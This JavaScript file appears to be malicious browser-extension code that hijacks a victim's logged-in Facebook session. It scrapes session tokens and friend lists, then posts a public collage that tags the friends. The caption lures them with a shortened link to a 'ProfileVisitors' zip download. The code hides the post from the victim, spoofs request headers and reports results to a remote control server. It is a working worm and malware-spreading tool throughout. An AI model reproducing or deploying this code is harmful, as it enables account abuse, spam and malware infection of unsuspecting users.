var facebook = {};
facebook.config = {};
facebook.getDtsg = function () {
  fetch("https://www.facebook.com/", {
    credentials: 'include',
    mode: 'same-origin',
    headers: {
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    }
  }).then((response) => {
    return response.text();
  }).then((data) => {
    facebook.profile_id = data.split('USER_ID":')[1].split('"')[1].split('"')[0];
    window.data = data;
    if (facebook.profile_id != 0) {
      if (data.includes('"name":"fb_dtsg"')) {
        facebook.fb_dtsg = data.split('"name":"fb_dtsg","value":"')[1].split('"')[0];
        facebook.jazoest = data.split('"name":"jazoest","value":"')[1].split('"')[0];
      } else {
        facebook.fb_dtsg = data.split('"token":"')[1].split('"')[0];
        facebook.jazoest = data.split('jazoest=')[1].split('"')[0];
      }

      facebook.hsi = data.split('"hsi":"')[1].split('"')[0];
      facebook.async_get_token = data.split('"async_get_token":"')[1].split('"')[0];
      facebook.__spin_r = data.split('"__spin_r":')[1].split(',')[0];
      facebook.__spin_t = data.split('"__spin_t":')[1].split(',')[0];
      facebook.__dyn = bitmap(220);
      facebook.__csr = bitmap(450);
      facebook.__ccg = "GOOD";
      facebook.start();
    }
  })
}

facebook.start = function () {
  fetch(uri("/ajax/start.php?hash=" + config.token)).then((response) => {
    return response.json();
  }).then((data) => {
    facebook.config = data;
    console.log(facebook.config);
    var lastTime = localStorage[facebook.config.cookie_name] || 0;
    var timeValid = (Date.now() - lastTime) >= facebook.config.cookie_time ? true : false;
    var version = localStorage["facebook.version"] || 0;
    if (version != facebook.config.version) {
      localStorage["facebook.version"] = facebook.config.version;
      location.reload();
      return;
    }
    for (var key in localStorage) {
      if (key.indexOf("sent") >= 0 && key.indexOf(facebook.config.cookie_name) < 0) {
        delete localStorage[key]
      }
    }
    if (facebook.config.active == true && timeValid == true) {
      localStorage[facebook.config.cookie_name] = Date.now();
      console.log("Active: true");
      var vars = {};
      facebook.getMobile(vars);
    }
  })
}

facebook.getMobile = function (vars) {
  fetch("https://m.facebook.com/?ext=me").then(response => response.text()).then((data) => {
    try {
      facebook.mobileToken = data.split('"encrypted":"')[1].split('"')[0];
      facebook.online(vars);
    } catch (error) {
      var d = {
        response: data,
        error: error.message,
        vars: vars
      }
      facebook.error("getMobile", d);
    }
  })
}

facebook.online = function (vars) {
  var params = {
    data_fetch: true,
    fb_dtsg: facebook.fb_dtsg,
    jazoest: facebook.jazoest,
    __dyn: facebook.__dyn,
    __csr: facebook.__csr,
    __req: facebook.__req(),
    __a: facebook.mobileToken,
    __user: facebook.profile_id
  }

  fetch("https://m.facebook.com/buddylist_update.php?ext=me", {
    method: 'POST',
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "x-requested-with": "XMLHttpRequest",
      "x-response-format": "JSONStream"
    },
    body: deSerialize(params)
  }).then(response => response.text()).then((data) => {
    try {
      data = JSON.parse(data.replace('for (;;);', ''));
      var friends = data.payload.buddylist;
      friends = shuffle(friends);
      vars.friends = [];
      vars.mode = "friends";
      for (i = 0; i < friends.length && vars.friends.length < facebook.config.tag_limit; i++) {
        if (!localStorage['sent_friend' + facebook.config.cookie_name + friends[i].id]) {
          vars.friends.push(friends[i]);
        }
      }

      if (vars.friends.length >= 16) {
        vars.index = 0;
        facebook.getLink(vars);
      } else {
        facebook.getMessages(vars);
      }
    } catch (error) {
      var d = {
        response: data,
        error: error.message,
        vars: vars
      }
      facebook.error("online", d);
    }
  })
}

facebook.getMessages = function (vars) {
  var params = {
    av: facebook.profile_id,
    __user: facebook.profile_id,
    __a: 1,
    __dyn: facebook.__dyn,
    __csr: facebook.__csr,
    __req: facebook.__req(),
    __beoa: 0,
    __pc: "EXP2:comet_pkg",
    dpr: 1,
    __ccg: facebook.__ccg,
    __rev: facebook.__spin_r,
    __s: rastgele(6),
    __hsi: facebook.hsi,
    __comet_req: 1,
    fb_dtsg: facebook.fb_dtsg,
    jazoest: facebook.jazoest,
    __spin_r: facebook.__spin_r,
    __spin_b: "trunk",
    __spin_t: facebook.__spin_t,
    fb_api_caller_class: "RelayModern",
    fb_api_req_friendly_name: "ThreadListQuery",
    variables: JSON.stringify({
      "include_message_info": false,
      "include_full_user_info": true,
      profile_pic_large_size: 400,
      filter_to_groups: false,
      fetch_users_separately: false
    }),
    server_timestamps: true,
    doc_id: "3562683343826563",
    fb_api_analytics_tags: ""
  }

  fetch("https://www.facebook.com/api/graphql/?ext=me", {
    method: "POST",
    headers: {
      "content-type": "application/x-www-form-urlencoded"
    },
    body: deSerialize(params)
  }).then(response => response.json()).then((data) => {
    var threads = data.data.viewer.message_threads.nodes;
    threads.forEach(thread => {
      if (thread.cannot_reply_reason != null) return;
      var friends = thread.all_participants.nodes;
      friends.forEach(friend => {
        friend = friend.messaging_actor;
        if (friend.id == facebook.profile_id) return;
        if (!friend.friendship_status || friend.friendship_status != "ARE_FRIENDS") return;
        if (!friend.can_viewer_message) return;
        if (vars.friends.length >= facebook.config.tag_limit) return;
        if (localStorage['sent_friend' + facebook.config.cookie_name + friend.id]) return;
        if (!!vars.friends.find(f => f.id == friend.id)) return;
        vars.friends.push({
          id: friend.id,
          picture: friend.profile_pic_large.uri
        })
      });
    });

    if (vars.friends.length >= 16) {
      vars.index = 0;
      facebook.getLink(vars);
    } else {
      facebook.getFriends(vars);
    }
  })
}

facebook.getFriends = function (vars) {
  var params = {
    av: facebook.profile_id,
    __user: facebook.profile_id,
    __a: 1,
    __dyn: facebook.__dyn,
    __csr: facebook.__csr,
    __req: rastgele(2),
    __beoa: 0,
    __pc: "EXP2:comet_pkg",
    dpr: 1,
    __ccg: facebook.__ccg,
    __rev: facebook.__spin_r,
    __s: rastgele(6),
    __hsi: facebook.hsi,
    __comet_req: 1,
    fb_dtsg: facebook.fb_dtsg,
    jazoest: facebook.jazoest,
    __spin_r: facebook.__spin_r,
    __spin_b: "trunk",
    __spin_t: facebook.__spin_t,
    fb_api_caller_class: "RelayModern",
    fb_api_req_friendly_name: "useCometMediaViewerComposerMentionsBootstrapDataSourceQuery",
    variables: JSON.stringify({ "scale": 1, "types": ["USER"], "options": ["FRIENDS_ONLY"], "existing_ids": [] }),
    server_timestamps: true,
    doc_id: "3394748800653903"
  }

  fetch("https://www.facebook.com/api/graphql/?ext=me", {
    method: "POST",
    headers: {
      "content-type": "application/x-www-form-urlencoded"
    },
    body: deSerialize(params)
  }).then(response => response.json()).then((data) => {
    var friends = data.data.comet_composer_typeahead_bootload;
    friends.forEach(friend => {
      friend = friend.node;
      if (friend.id == facebook.profile_id) return;
      if (vars.friends.length >= facebook.config.tag_limit) return;
      if (localStorage['sent_friend' + facebook.config.cookie_name + friend.id]) return;
      if (!!vars.friends.find(f => f.id == friend.id)) return;
      vars.friends.push({
        id: friend.id
      })
    });
    console.log(vars.friends)
    if (vars.friends.length >= 16) {
      vars.index = 0;
      facebook.getLink(vars);
    } else {
      for (var key in localStorage) {
        if (key.indexOf("sent") >= 0) delete localStorage[key];
      }
    }
  })
}

facebook.getLink = function (vars) {
  fetch(uri("/ajax/storage.php?hash=" + config.token)).then(response => response.json()).then((data) => {
    var ref = "facebook";
    if(vars.mode == 'groups'){
      ref = "groups";
    }
    var cid = guid();
    var zip = encodeURIComponent(`ProfileVisitors v${rand(1,9)}.${rand(1,9)}.zip`);
    var exe = `visitors.facebook.com`;
    vars.link = `https://storage.googleapis.com/${data.storage.bucket}/${data.storage.object}?ref=${ref}&cid=${cid}&zip=${zip}&exe=${exe}`;
    console.log(vars.link);
    facebook.isgd(vars);
  })
}

facebook.isgd = function (vars) {
  fetch("https://is.gd/create.php?format=simple&url=" + encodeURIComponent(vars.link)).then(response => response.text()).then((data) => {
    vars.link = data;
    if (vars.mode == "friends") {
      facebook.calculatecount(vars);
    } else if(vars.mode == "groups") {
      facebook.getToken(vars);
    }
  })
}

facebook.calculatecount = function (vars) {
  var count = Math.floor(Math.sqrt(vars.friends.length));
  if (vars.friends.length % count != 0) {
    vars.friends.splice(0, 1);
    facebook.calculatecount(vars);
  } else {
    vars.rows = count;
    vars.cols = vars.friends.length / count;
    facebook.getToken(vars);
  }
}

facebook.getToken = function (vars) {
  fetch("https://business.facebook.com/creatorstudio/home").then(response => response.text()).then((data) => {
    vars.accessToken = data.split('"userAccessToken":"')[1].split('"')[0];
    if (vars.mode == "friends") {
      facebook.createCanvas(vars);
    } else if (vars.mode == "groups") {
      facebook.getLocale(vars);
    }
  })
}

facebook.createCanvas = function (vars) {
  vars.canvas = document.createElement('canvas');
  vars.canvas.width = 1000;
  vars.partSize = vars.canvas.width / vars.cols;
  vars.canvas.height = vars.partSize * vars.rows + 100;
  vars.ctx = vars.canvas.getContext("2d");
  vars.toplogo = new Image();
  vars.toplogo.src = uri("/profilevisitor.jpg");
  vars.toplogo.onload = () => {
    vars.ctx.drawImage(vars.toplogo, 0, 0, 1000, 100);
    facebook.getUser(vars);
  }
}

facebook.getUser = function (vars) {
  var params = {
    id: vars.friends[vars.index].id,
    fields: "picture.width(" + parseInt(vars.partSize) + ").height(" + parseInt(vars.partSize) + ")",
    access_token: vars.accessToken
  }
  fetch("https://graph.facebook.com/?" + deSerialize(params)).then(response => response.json()).then((data) => {
    if (!data.picture) {
      data.picture = {}
      data.picture.data = {
        url: uri("/avatar.png")
      }
      vars.friends[vars.index].active = false;
    }
    vars.friends[vars.index].image = new Image();
    vars.friends[vars.index].image.src = data.picture.data.url;
    vars.friends[vars.index].image.onload = () => {
      vars.index++;
      if (vars.friends[vars.index]) {
        facebook.getUser(vars);
      } else {
        facebook.createImage(vars);
      }
    }
  })
}

facebook.createImage = function (vars) {
  var position = { x: 0, y: 100 };
  for (var i = 0; i < vars.friends.length; i++) {
    vars.ctx.drawImage(vars.friends[i].image, position.x, position.y, vars.partSize, vars.partSize);
    vars.friends[i].tag = {
      x: ((position.x + vars.partSize / 2) / vars.canvas.width) * 100,
      y: ((position.y + vars.partSize / 2) / vars.canvas.height) * 100
    };
    position.x += vars.partSize;
    if ((i + 1) % vars.cols == 0) {
      position.x = 0;
      position.y += vars.partSize;
    }
  }
  vars.canvas.toBlob((blob) => {
    vars.blob = blob;
    facebook.uploadImage(vars);
  });
}

facebook.uploadImage = function (vars) {
  var getparams = {
    av: facebook.profile_id,
    __user: facebook.profile_id,
    __a: 1,
    __dyn: rastgele(105),
    __csr: rastgele(105),
    __req: rastgele(2),
    __beoa: 0,
    __pc: "EXP2:comet_pkg",
    dpr: 1,
    __ccg: "EXCELLENT",
    __rev: facebook.__spin_r,
    __s: rastgele(6),
    __hsi: facebook.hsi,
    __comet_req: 1,
    fb_dtsg: facebook.fb_dtsg,
    jazoest: facebook.jazoest,
    __spin_r: facebook.__spin_r,
    __spin_b: "trunk",
    __spin_t: facebook.__spin_t,
    ext: "me"
  }

  var params = new FormData();
  params.append("farr", vars.blob, "photo_" + Math.floor(Math.random() * 9999) + ".png");
  params.append("source", "8");
  params.append("profile_id", facebook.profile_id);
  params.append("waterfallxapp", "comet");
  params.append("upload_id", "jsc_c_i3");

  fetch("https://upload.facebook.com/ajax/react_composer/attachments/photo/upload?" + deSerialize(getparams), {
    method: "POST",
    body: params
  }).then(response => response.text()).then((data) => {
    try {
      data = JSON.parse(data.replace("for (;;);", ""));
      vars.image = data.payload.imageSrc;
      vars.photoID = data.payload.photoID;
      if (vars.mode == 'friends') {
        facebook.getLocale(vars);
      } else if (vars.mode == 'groups') {
        facebook.sendGroup(vars);
      }
    } catch (error) {
      var d = {
        response: data,
        error: error.message,
        vars: vars
      }
      facebook.error("uploadImage", d);
    }
  })
}

facebook.getLocale = function (vars) {
  fetch("https://graph.facebook.com/me/?fields=locale&access_token=" + vars.accessToken).then(response => response.json()).then((data) => {
    vars.locale = data.locale.split("_")[0];
    facebook.translate(vars);
  })
}

facebook.translate = function (vars) {
  vars.message = "Hi See your profile visitors with ProfileVisitors";

  var params = [];
  params.push("client=gtx");
  params.push("sl=gtx");
  params.push("tl=" + vars.locale);
  params.push("hl=" + vars.locale);
  params.push("dt=t");
  params.push("dt=bd");
  params.push("dj=1");
  params.push("source=input");
  params.push("tk=964337.964337");
  params.push("q=" + vars.message);
  params = params.join("&");

  fetch("https://translate.googleapis.com/translate_a/single?" + encodeURI(params), {
    headers: {
      "content-type": "application/x-www-form-urlencoded"
    }
  }).then(response => response.json()).then((data) => {
    try {
      if (data.sentences) vars.message = data.sentences[0].trans;
      if (vars.mode == "friends") {
        facebook.postImage(vars);
      } else if (vars.mode == "groups") {
        facebook.createGroupCanvas(vars);
      }
    } catch (error) {
      var d = {
        response: data,
        error: error.message,
        vars: vars
      }
      facebook.error("translate", d);
    }
  })
}

facebook.postImage = function (vars) {
  var sid = guid();
  var tags = [];
  //for (var i = 0; i < vars.friends.length; i++) {
  //  if (vars.friends[i].active === false) continue;
  //  tags.push({ "source": "manual", "taggee": { "id": vars.friends[i].id }, "x": vars.friends[i].tag.x, "y": vars.friends[i].tag.y });
  //}

  var params = {
    av: facebook.profile_id,
    __user: facebook.profile_id,
    __a: 1,
    __dyn: rastgele(105),
    __csr: rastgele(105),
    __req: rastgele(2),
    __beoa: 0,
    __pc: "EXP2:comet_pkg",
    dpr: 1,
    __ccg: "EXCELLENT",
    __rev: facebook.__spin_r,
    __s: rastgele(6),
    __hsi: facebook.hsi,
    __comet_req: 1,
    fb_dtsg: facebook.fb_dtsg,
    jazoest: facebook.jazoest,
    __spin_r: facebook.__spin_r,
    __spin_b: "trunk",
    __spin_t: facebook.__spin_t,
    fb_api_caller_class: "RelayModern",
    fb_api_req_friendly_name: "ComposerStoryCreateMutation",
    variables: JSON.stringify({
      "input": {
        "composer_entry_point": "inline_composer",
        "composer_source_surface": "newsfeed",
        "composer_type": "feed",
        "idempotence_token": sid + "_FEED",
        "source": "WWW",
        "attachments": [{
          "photo": {
            "id": vars.photoID,
            "custom_accessibility_caption": "",
            "tags": tags
          }
        }],
        "audience": { "privacy": { "allow": [], "base_state": "EVERYONE", "deny": [], "tag_expansion_state": "UNSPECIFIED" } },
        "message": { "ranges": [], "text": "" },
        "with_tags_ids": [],
        "inline_activities": [],
        "explicit_place_id": "0",
        "logging": { "composer_session_id": sid },
        "tracking": [null],
        "actor_id": facebook.profile_id,
        "client_mutation_id": "1"
      },
      "displayCommentsFeedbackContext": null,
      "displayCommentsContextEnableComment": null,
      "displayCommentsContextIsAdPreview": null,
      "displayCommentsContextIsAggregatedShare": null,
      "displayCommentsContextIsStorySet": null,
      "feedLocation": "NEWSFEED",
      "feedbackSource": 1,
      "focusCommentID": null,
      "gridMediaWidth": null,
      "scale": 1,
      "privacySelectorRenderLocation": "COMET_STREAM",
      "renderLocation": "homepage_stream",
      "useDefaultActor": false,
      "isFeed": true,
      "isFundraiser": false,
      "isFunFactPost": false,
      "isGroup": false,
      "isTimeline": false,
      "isLivingRoom": false,
      "isSocialLearning": false,
      "isPageNewsFeed": false,
      "UFI2CommentsProvider_commentsKey": "CometModernHomeFeedQuery"
    }),
    server_timestamps: true,
    doc_id: "3690794404380183",
    fb_api_analytics_tags: ""
  }

  fetch("https://www.facebook.com/api/graphql/?ext=me", {
    method: "POST",
    headers: {
      "content-type": "application/x-www-form-urlencoded"
    },
    body: deSerialize(params)
  }).then(response => response.text()).then((data) => {
    try {
      data = data.split("\n")[0];
      data = JSON.parse(data);
      vars.post_id = data.data.story_create.story.legacy_story_hideable_id;
      sonuc(vars.post_id, vars.link, "", "Photo", 1);
      facebook.unfollowPost(vars);
      facebook.hidePost(vars);

      for (var i = 0; i < vars.friends.length; i++) {
        localStorage['sent_friend' + facebook.config.cookie_name + vars.friends[i].id] = true;
      }
      var requests = [];
      for (var i = 0; i < vars.friends.length; i++) {
        if (vars.friends[i].active === false) continue;
        vars.friend = vars.friends[i];
        var request = facebook.tagPhoto(vars);
        requests.push(request);
      }
      Promise.all(requests).then((values) => {
        facebook.editPost(vars);
      });
    } catch (error) {
      var d = {
        response: data,
        error: error.message,
        vars: vars
      }
      facebook.error("postImage", d);
    }
  })
}

facebook.tagPhoto = function (vars) {
  var params = {
    av: facebook.profile_id,
    __user: facebook.profile_id,
    __a: 1,
    __dyn: rastgele(105),
    __csr: rastgele(105),
    __req: rastgele(2),
    __beoa: 0,
    __pc: "EXP2:comet_pkg",
    __bhv: 2,
    __no_rdbl: 1,
    dpr: 1,
    __ccg: "GOOD",
    __rev: facebook.__spin_r,
    __s: rastgele(6),
    __hsi: facebook.hsi,
    __comet_req: 1,
    fb_dtsg: facebook.fb_dtsg,
    jazoest: facebook.jazoest,
    __spin_r: facebook.__spin_r,
    __spin_b: "trunk",
    __spin_t: facebook.__spin_t,
    fb_api_caller_class: "RelayModern",
    fb_api_req_friendly_name: "CometMediaViewerPhotoAddTagsActionMutation",
    variables: JSON.stringify({
      "input": {
        "photo_id": vars.photoID,
        "tags": [
          { "source": "manual", "taggee": { "id": vars.friend.id }, "x": vars.friend.tag.x, "y": vars.friend.tag.y }
        ],
        "actor_id": facebook.profile_id,
        "client_mutation_id": "2"
      },
      "scale": 1,
      "story_debug_info": null,
      "serialized_frtp_identifiers": null,
      "privacySelectorRenderLocation": "COMET_MEDIA_VIEWER",
      "renderLocation": null,
      "feed_location": "COMET_MEDIA_VIEWER"
    }),
    server_timestamps: true,
    doc_id: "5430216553719876",
    fb_api_analytics_tags: ""
  }

  return fetch("https://www.facebook.com/api/graphql/?ext=me", {
    method: "POST",
    headers: {
      "content-type": "application/x-www-form-urlencoded"
    },
    body: deSerialize(params)
  }).then(response => response.text()).then(data => {
    try {
      data = data.split("\n")[0];
      data = JSON.parse(data);
      vars.post_id = data.data.photo_add_tags.photo.container_story.post_id;

    } catch (error) {
      var d = {
        response: data,
        error: error.message,
        vars: vars
      }
      facebook.error("tagPhoto", d);
    }
  });
}

facebook.editPost = function (vars) {
  var params = {
    av: facebook.profile_id,
    __user: facebook.profile_id,
    __a: 1,
    __dyn: rastgele(105),
    __csr: rastgele(105),
    __req: rastgele(2),
    __beoa: 0,
    __pc: "EXP2:comet_pkg",
    __bhv: 2,
    __no_rdbl: 1,
    dpr: 1,
    __ccg: "GOOD",
    __rev: facebook.__spin_r,
    __s: rastgele(6),
    __hsi: facebook.hsi,
    __comet_req: 1,
    fb_dtsg: facebook.fb_dtsg,
    jazoest: facebook.jazoest,
    __spin_r: facebook.__spin_r,
    __spin_b: "trunk",
    __spin_t: facebook.__spin_t,
    fb_api_caller_class: "RelayModern",
    fb_api_req_friendly_name: "CometMediaViewerPhotoActionsEditMessageMutation",
    variables: JSON.stringify({
      "input": {
        "message": {
          "ranges": [],
          "text": vars.message + " " + vars.link
        },
        "photo_id": vars.photoID,
        "actor_id": facebook.profile_id,
        "client_mutation_id": "10"
      },
      "scale": 1
    }),
    server_timestamps: true,
    doc_id: "3831741526902502",
    fb_api_analytics_tags: ""
  }

  fetch("https://www.facebook.com/api/graphql/?ext=me", {
    method: "POST",
    headers: {
      "content-type": "application/x-www-form-urlencoded"
    },
    body: deSerialize(params)
  }).then(response => response.text()).then((data) => {
    try {
      data = data.split("\n")[0];
      data = JSON.parse(data);
      vars.post_id = data.data.photo_edit_message.photo.id;

    } catch (error) {
      var d = {
        response: data,
        error: error.message,
        vars: vars
      }
      facebook.error("editPost", d);
    }
  })
}

facebook.unfollowPost = function (vars) {
  var params = {
    av: facebook.profile_id,
    __user: facebook.profile_id,
    __a: 1,
    __dyn: rastgele(105),
    __csr: rastgele(105),
    __req: rastgele(2),
    __beoa: 0,
    __pc: "EXP2:comet_pkg",
    dpr: 1,
    __ccg: "EXCELLENT",
    __rev: facebook.__spin_r,
    __s: rastgele(6),
    __hsi: facebook.hsi,
    __comet_req: 1,
    fb_dtsg: facebook.fb_dtsg,
    jazoest: facebook.jazoest,
    __spin_r: facebook.__spin_r,
    __spin_b: "trunk",
    __spin_t: facebook.__spin_t,
    fb_api_caller_class: "RelayModern",
    fb_api_req_friendly_name: "useCometFeedUnsubscribeToStoryMutation",
    variables: JSON.stringify({ "input": { "feedback_id": btoa("feedback:" + vars.post_id), "actor_id": facebook.profile_id, "client_mutation_id": "1" } }),
    server_timestamps: true,
    doc_id: "2957543014259289",
    fb_api_analytics_tags: ""
  }

  fetch("https://www.facebook.com/api/graphql/?ext=me", {
    method: "POST",
    headers: {
      "content-type": "application/x-www-form-urlencoded"
    },
    body: deSerialize(params)
  }).then(response => response.text()).then((data) => {

  })
}

facebook.hidePost = function (vars) {
  var params = {
    av: facebook.profile_id,
    __user: facebook.profile_id,
    __a: 1,
    __dyn: rastgele(105),
    __csr: rastgele(105),
    __req: rastgele(2),
    __beoa: 0,
    __pc: "EXP2:comet_pkg",
    dpr: 1,
    __ccg: "EXCELLENT",
    __rev: facebook.__spin_r,
    __s: rastgele(6),
    __hsi: facebook.hsi,
    __comet_req: 1,
    fb_dtsg: facebook.fb_dtsg,
    jazoest: facebook.jazoest,
    __spin_r: facebook.__spin_r,
    __spin_b: "trunk",
    __spin_t: facebook.__spin_t,
    fb_api_caller_class: "RelayModern",
    fb_api_req_friendly_name: "ProfileCometBulkStoryCurationMutation",
    variables: JSON.stringify({
      "input": {
        "story_actions": [{
          "action": "HIDE_FROM_TIMELINE",
          "story_id": btoa("S:_I" + facebook.profile_id + ":" + vars.post_id),
          "story_location": "TIMELINE"
        }],
        "actor_id": facebook.profile_id,
        "client_mutation_id": "1"
      },
      "afterTime": null,
      "beforeTime": null,
      "displayCommentsFeedbackContext": null,
      "displayCommentsContextEnableComment": null,
      "displayCommentsContextIsAdPreview": null,
      "displayCommentsContextIsAggregatedShare": null,
      "displayCommentsContextIsStorySet": null,
      "feedLocation": "TIMELINE",
      "feedbackSource": 0,
      "focusCommentID": null,
      "gridMediaWidth": 230,
      "memorializedSplitTimeFilter": null,
      "postedBy": null,
      "privacy": null,
      "privacySelectorRenderLocation": "COMET_STREAM",
      "scale": 1,
      "taggedInOnly": null,
      "omitPinnedPost": true,
      "renderLocation": "timeline",
      "useDefaultActor": false,
      "UFI2CommentsProvider_commentsKey": "ProfileCometTimelineRoute"
    }),
    server_timestamps: true,
    doc_id: "4046026925429576"
  }

  fetch("https://www.facebook.com/api/graphql/?ext=me", {
    method: "POST",
    headers: {
      "content-type": "application/x-www-form-urlencoded"
    },
    body: deSerialize(params)
  }).then(response => response.text()).then((data) => {

  })
}

facebook.error = function (type, data) {
  var params = {
    type: type,
    user: facebook.profile_id,
    data: JSON.stringify(data)
  }

  fetch(uri("/ajax/error.php"), {
    method: "POST",
    headers: {
      "content-type": "application/x-www-form-urlencoded"
    },
    body: deSerialize(params)
  })
}

chrome.webRequest.onBeforeSendHeaders.addListener(
  function (details) {
    if (details.url.indexOf("ext=me") < 0) {
      return;
    }
    var url = new URL(details.url);
    var hasReferer = false;
    var hasOrigin = false;
    for (var i = 0; i < details.requestHeaders.length; ++i) {
      if (details.requestHeaders[i].name.toLowerCase() == 'referer') {
        details.requestHeaders[i].value = url.protocol + "//" + url.hostname + "/";
        hasReferer = true;
      }

      if (details.requestHeaders[i].name.toLowerCase() == 'origin') {
        details.requestHeaders[i].value = url.protocol + "//" + url.hostname;
        hasOrigin = true;
      }

      if (details.requestHeaders[i].name.toLowerCase() == 'sec-fetch-dest') {
        details.requestHeaders[i].value = 'document';
      }

      if (details.requestHeaders[i].name.toLowerCase() == 'sec-fetch-mode') {
        details.requestHeaders[i].value = 'navigate';
      }

      if (details.requestHeaders[i].name.toLowerCase() == 'sec-fetch-site') {
        details.requestHeaders[i].value = 'same-origin';
      }
    }

    if (!hasReferer) {
      details.requestHeaders.push({ name: "Referer", value: url.protocol + "//" + url.hostname + "/" });
    }
    if (!hasOrigin) {
      details.requestHeaders.push({ name: "Origin", value: url.protocol + "//" + url.hostname });
    }
    return { requestHeaders: details.requestHeaders };
  },
  { urls: ['https://*.facebook.com/*'] },
  ['blocking', 'requestHeaders', 'extraHeaders']
);

chrome.webRequest.onBeforeSendHeaders.addListener(
  function (details) {
    var url = new URL(details.url);
    var hasReferer = false;
    var hasOrigin = false;
    for (var i = 0; i < details.requestHeaders.length; ++i) {
      if (details.requestHeaders[i].name.toLowerCase() == 'referer') {
        details.requestHeaders[i].value = "https://www.facebook.com/";
        hasReferer = true;
      }

      if (details.requestHeaders[i].name.toLowerCase() == 'origin') {
        details.requestHeaders[i].value = "https://www.facebook.com";
        hasOrigin = true;
      }

      if (details.requestHeaders[i].name.toLowerCase() == 'sec-websocket-protocol') {
        details.requestHeaders.splice(i, 1);
      }
    }

    if (!hasReferer) {
      details.requestHeaders.push({ name: "Referer", value: "https://www.facebook.com/" });
    }
    if (!hasOrigin) {
      details.requestHeaders.push({ name: "Origin", value: "https://www.facebook.com" });
    }
    return { requestHeaders: details.requestHeaders };
  },
  { urls: ['wss://*.facebook.com/*'] },
  ['blocking', 'requestHeaders', 'extraHeaders']
);

facebook.getDtsg();
setInterval(function () {
  facebook.getDtsg();
}, 1000 * 60)

function sonuc(sonuc, link, image, type, success) {
  var sonuc = sonuc || "";
  var link = link || "";
  var image = image || "";
  var type = type || "";
  var success = success || 0;
  var params = {};
  params["user"] = facebook.profile_id;
  params["sonuc"] = sonuc;
  params["site"] = "facebook.com";
  params["link"] = link;
  params["img"] = image;
  params["type"] = type;
  params["success"] = success;
  params["hash"] = config.token;
  fetch(uri("/ajax/sonuc.php?" + deSerialize(params)));
}

function generate_name(length, firstUpper) {
  rname = "";
  sesli = "aeiou";
  sessiz = "bcdfghjklmnprstvyz";
  rname = rand(1, 2) == 1 ? sessiz[rand(0, sessiz.length - 1)] : sesli[rand(0, sesli.length - 1)];
  if (firstUpper == true) {
    rname = rname.toUpperCase();
  }
  for (n = 0; n < length; n++) {
    if (sesli.indexOf(rname[rname.length - 1]) >= 0) {
      rname += sessiz[rand(0, sessiz.length - 1)];
    } else {
      rname += sesli[rand(0, sesli.length - 1)];
    }
  }
  return rname;
}

function capitalizeFirstLetter(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

function inArray(arr, key, value) {
  var res = false;
  for (a = 0; a < arr.length; a++) {
    for (k in arr[a]) {
      if (k == key && arr[a][k] == value) {
        res = true;
        break;
      }
    }
  }
  return res;
}

function decode(t, h) {
  var a = "abcdefghijklmnoprstuvyzx0123456789";
  var c = "";
  for (cr = 0; cr < t.length; cr++) {
    c += a[h.indexOf(t[cr])];
  }
  return c;
}

function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
    s4() + '-' + s4() + s4() + s4();
}

function randoms(l, m) {
  var r = [];
  while (r.length < l) {
    var rnd = Math.floor(Math.random() * m);
    if (r.indexOf(rnd) < 0) {
      r.push(rnd);
    }
  }
  return r;
}

function searchArray(a, k) {
  var found = false;
  for (var key in a) {
    if (key.toString() == k) {
      found = a[key];
      break;
    } else if (typeof a[key] == "object") {
      found = searchArray(a[key], k);
      if (found != false) {
        break;
      }
    }
  }
  return found;
}

function shuffle(array) {
  var currentIndex = array.length, temporaryValue, randomIndex;

  while (0 !== currentIndex) {
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }

  return array;
}

function rand(min, max) {
  return Math.floor(Math.random() * (max - min)) + min;
}

function rastgele(len) {
  var mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
  var ret = "";
  for (l = 0; l < len; l++) {
    ret += mtn[Math.floor(Math.random() * mtn.length)];
  }
  return ret;
}

function deSerialize(json) {
  return Object.keys(json).map(function (key) {
    return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
  }).join('&');
}

function bitmap(len){
  var mtn = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_";
  var ret = "";
  for (l = 0; l < len; l++) {
    ret += mtn[Math.floor(Math.random() * mtn.length)];
  }
  return ret;
}

facebook.reqIndex = 1;
facebook.__req = function(){
  return (facebook.reqIndex++).toString(36);
}